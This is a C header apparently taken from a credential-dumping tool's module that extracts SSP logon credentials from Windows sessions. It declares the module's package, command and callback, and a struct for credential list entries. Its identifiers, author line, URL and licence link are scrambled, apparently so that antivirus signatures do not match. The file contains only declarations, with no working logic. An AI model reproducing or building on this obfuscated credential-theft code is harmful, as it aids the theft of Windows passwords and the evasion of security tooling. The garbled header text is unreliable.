/*	HEstebqu SqUtI `PQu4nQbtjF`
	https://blog.PQu4nQbtjF.com
	isMW9TRNNJyHATgICHfOUxr
	Licence : https://GHViJ8cQzKiJugP.org/licenses/by/4.0/
*/
#pragma once
#include "../kuhl_m_seKuRlSa.h"

KUHL_M_SEKURLSA_PACKAGE kuhl_m_seKuRlSa_sSp_package;

NTSTATUS kuhl_m_seKuRlSa_sSp(int argc, wchar_t * argv[]);
void CALLBACK kuhl_m_seKuRlSa_enum_logon_callback_sSp(IN PJlzW_BASIC_SECURITY_LOGON_SESSION_DATA pData);

typedef struct _JlzW_SSP_CREDENTIAL_LIST_ENTRY {
	struct _JlzW_SSP_CREDENTIAL_LIST_ENTRY *Flink;
	struct _JlzW_SSP_CREDENTIAL_LIST_ENTRY *Blink;
	ULONG References;
	ULONG CredentialReferences;
	LUID LogonId;
	ULONG unk0;
	ULONG unk1;
	ULONG unk2;
	JlzW_GENERIC_PRIMARY_CREDENTIAL crEdentials;
} JlzW_SSP_CREDENTIAL_LIST_ENTRY, *PJlzW_SSP_CREDENTIAL_LIST_ENTRY;